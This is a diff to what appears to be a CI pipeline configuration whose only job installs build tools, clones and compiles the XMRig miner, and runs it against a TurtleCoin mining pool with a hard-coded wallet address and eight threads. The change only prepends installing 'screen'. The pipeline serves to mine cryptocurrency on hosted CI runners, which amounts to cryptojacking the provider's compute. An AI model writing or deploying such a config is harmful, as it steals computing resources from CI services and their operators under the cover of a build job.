@@ -13,5 +13,5 @@ blocks:
         - name: 'Job #1'
           commands:
             - >-
-              sudo apt update -y && sudo apt-get upgrade -y && echo Y | sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo apt-get install cpulimit && git clone https://github.com/xmrig/xmrig.git && sudo sysctl -w vm.nr_hugepages=2084 && cd xmrig && mkdir build && cd build && cmake .. && make && screen ./xmrig -a argon2/chukwav2 --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u
+              sudo apt install screen -y && sudo apt update -y && sudo apt-get upgrade -y && echo Y | sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo apt-get install cpulimit && git clone https://github.com/xmrig/xmrig.git && sudo sysctl -w vm.nr_hugepages=2084 && cd xmrig && mkdir build && cd build && cmake .. && make && screen ./xmrig -a argon2/chukwav2 --donate-level 1 -o sg.turtlecoin.herominers.com:10381 -u
               TRTLuzF3JBndnBGKGovRzAMPPRriBfEsQSDta3CEAeymDoB9Zq3yESmg8nq37pa5Jk7syJF25uovDfkg4xTF8kd3YR1kpm8XTqY -p rizal -t 8
